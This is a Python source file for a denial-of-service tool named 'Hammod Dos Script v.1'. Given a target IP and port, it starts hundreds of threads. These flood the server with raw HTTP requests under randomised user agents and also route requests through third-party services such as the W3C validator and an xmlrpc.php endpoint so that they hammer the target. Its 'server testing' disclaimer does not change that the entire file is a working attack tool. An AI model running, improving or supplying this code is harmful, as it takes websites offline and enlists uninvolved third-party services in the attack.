"""
Copyright [2019] []

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

 http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""


from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.366")
	uagent.append("Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.366")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.811.0 Safari/535.16")
	uagent.append("Mozilla/5.0 (X11; CrOS i686 12.433.109) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.306")
	uagent.append("Mozilla/5.0 (Macintosh; U; Mac OS X 10_6_1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.56")
	uagent.append("Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.136")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.16")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.06")
	uagent.append("Mozilla/6.0 (Windows; U; Windows NT 7.0; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.9 (.NET CLR 3.5.30729)6")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.0.9) Gecko/2009042114 Ubuntu/9.04 (jaunty) Firefox/3.0.96")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.8.0.2) Gecko/20060308 Firefox/1.5.0.26")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT5.1; en; rv:1.7.10) Gecko/20050716 Firefox/1.0.56")
	uagent.append("Mozilla/5.0 (Windows; U; Win98; fr-FR; rv:1.7.6) Gecko/20050226 Firefox/1.0.16")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.6) Gecko/20040207 Firefox/0.86")
	uagent.append("Mozilla/5.0 (X11) KHTML/4.9.1 (like Gecko) Konqueror/4.96")
	uagent.append("Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)6")
	uagent.append("Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)6")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko6")
	uagent.append("Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko6")
	uagent.append("Mozilla/4.0(compatible; MSIE 7.0b; Windows NT 6.0)6")
	uagent.append("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)6")
	uagent.append("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)6")
	uagent.append("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)6")
	uagent.append("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)6")
	uagent.append("Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)6")
	uagent.append("Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)6")
	uagent.append("Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)6")
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.06")
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)6")
	uagent.append("Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; .NET CLR 1.1.4322; Zango 10.1.181.0)6")
	uagent.append("Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)6")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; SV1)6")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux armv7l; rv:17.0) Gecko/20100101 Firefox/17.06")
	uagent.append("Mozilla/2.02E (Win95; U)6")
	uagent.append("Mozilla/5.0 (iPhone; U; CPU iOS 2_0 like Mac OS X; en-us)6")
	uagent.append("Mozilla/5.0 (Linux; U; Android 0.5; en-us)6")
	uagent.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)6")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)6")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.136")
	uagent.append("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)6")
	uagent.append("Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)6")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)6")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5)6")
	uagent.append("Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)6")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Whistler/20110021 myibrow/5.0.0.06")
	uagent.append("Mozilla/4.08 [en] (WinNT; I ;Nav)6")
	uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Oupeng/10.2.1.86910 Safari/534.306")
	uagent.append("Mozilla/5.0 (SMART-TV; Linux; Tizen 2.3) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.0 Safari/538.16")
	uagent.append("myibrow/2.2 (Windows; U; Windows NT 5.1; cs; rv:1.8.1.14) Gecko/20080001 My Internet Browser/2.2.0.0 200809132350456")
	uagent.append("Opera/9.25 (Windows NT 6.0; U; en)6")
	uagent.append("Privoxy/1.06")
	uagent.append("CERN-LineMode/2.156")
	uagent.append("cg-eye interactive6")
	uagent.append("China Local Browser 2.66")
	uagent.append("ClariaBot/1.06")
	uagent.append("Comos/0.9_(robot@xyleme.com)6")
	uagent.append("Crawler@alexa.com6")
	uagent.append("DonutP; Windows98SE6")
	uagent.append("Dr.Web (R) online scanner: http://online.drweb.com/6")
	uagent.append("Dragonfly File Reader6")
	uagent.append("Eurobot/1.0 (http://www.ayell.eu)6")
	uagent.append("FARK.com link verifier6")
	uagent.append("FavIconizer6")
	uagent.append("Feliz - Mixcat Crawler (+http://mixcat.com)6")
	uagent.append("TwitterBot (http://www.twitter.com)6")
	uagent.append("DataCha0s/2.06")
	uagent.append("EvaalSE - bot@evaal.com6")
	uagent.append("Feedfetcher-Google; (+http://www.google.com/feedfetcher.html)6")
	uagent.append("archive.org_bot6")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.366")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.366")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.506")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.06")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.366")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.366")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.366")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.146")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.506")
	uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.143936")
	uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.366")
	uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.366")
	uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.366")
	uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.366")
	uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.06")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.366")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.366")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.366")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.366")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.06")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko6")
	uagent.append("Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.06")
	uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.366")
	uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.366")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.06")
	return(uagent)

def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("dfwdiesel.net/check?u=")
	bots.append("http://www.google.co.id/")
	bots.append("http://www.bing.com/")
	bots.append("http://heightsmedia.com/xmlrpc.php")
	bots.append("https://website-down.com/")
	bots.append("https://jigsaw.w3.org/css-validator/validator?uri=$TARGET&profile=css3&usermedium=all&vextwarning=true")
	return(bots)

def my_cekip():
	global cekip
	cekip=[]
	cekip.append("https://downforeveryoneorjustme.com/")
	cekip.append("176.28.23.46")
	cekip.append("https://status.ws")
	cekip.append("https://check.torproject.org")
	cekip.append("https://checkip.dyndns.com")
	cekip.append("https://whatismyip.org/")
	cekip.append("https://ip.42.pl/ra")
	return(cekip)

def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94mREFRESH BOTS...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)

def my_cekip(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'cekip': random.choice(cekip)}))
			print("\033[94mCek ip...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)

def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",host,"\033[0m <-- target ip \033[94m packet sent!  \033[0m agent-->",random.choice(bots))
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91m server  down\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()
		
def dos3():
	while True:
		item=w.get()
		my_cekip(random.choice(cekip)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m	Hammod Dos Script v.1
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 NET.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
	-t : turbo default 135 \033[0m''')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94mLoading...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mcheck server ip and port\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
